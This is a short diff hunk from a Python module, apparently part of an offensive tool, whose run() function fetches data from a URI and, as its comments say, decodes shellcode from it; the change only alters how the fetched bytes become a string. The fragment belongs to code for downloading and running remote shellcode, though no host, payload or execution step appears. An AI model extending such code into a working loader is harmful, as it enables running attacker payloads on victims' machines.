@@ -56,7 +56,7 @@ def run(**args):
   	return "getFileFromURI: Connection refused"
   # decode the shellcode from base64
 
-  shellcode = r.data.decode("utf-8")  ####shellcode = base64.b64decode(r.data)
+  shellcode = str(r.data) #.decode("utf-8")  ####shellcode = base64.b64decode(r.data)
   cmd = ""
 
   if bin:
